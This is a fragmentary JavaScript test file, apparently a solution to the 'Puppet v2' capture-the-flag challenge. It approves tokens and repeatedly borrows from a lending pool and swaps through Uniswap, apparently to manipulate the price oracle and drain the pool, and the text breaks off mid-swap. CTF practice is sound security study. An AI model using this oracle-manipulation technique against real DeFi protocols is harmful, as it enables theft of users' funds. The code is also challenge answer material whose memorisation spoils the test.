...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Execution", async function () {
    ...
    await weth.connect(player).deposit({ value: 10n * 10n ** 18n });
    await weth
      .connect(player)
      .approve(lendingPool.address, 10000n * 10n ** 18n);
    await weth
      .connect(player)
      .approve(uniswapRouter.address, 10000n * 10n ** 18n);
    await token
      .connect(player)
      .approve(uniswapRouter.address, 100000000n * 10n ** 18n);

    for (let i = 0; i < 1; i++) {
      let tokenBalance = await token.balanceOf(player.address);
      ...
      let needWeth = await lendingPool.calculateDepositOfWETHRequired(
        1000n * 10n ** 18n
      );
      console.log("needWeth", needWeth.toString());
      await lendingPool.connect(player).borrow(1000n * 10n ** 18n);
    }
    console.log(" ");
    for (let i = 0; i < 2; i++) {
      let tokenBalance = await token.balanceOf(player.address);
      ...
      console.log("needWeth", needWeth.toString());
      await lendingPool.connect(player).borrow(100000n * 10n ** 18n);
    }
    await lendingPool.connect(player).borrow(799000n * 10n ** 18n);
    await uniswapRouter
      .connect(player)
      .swapExactTokensForTokens(
        1n * 10n ** 18n,
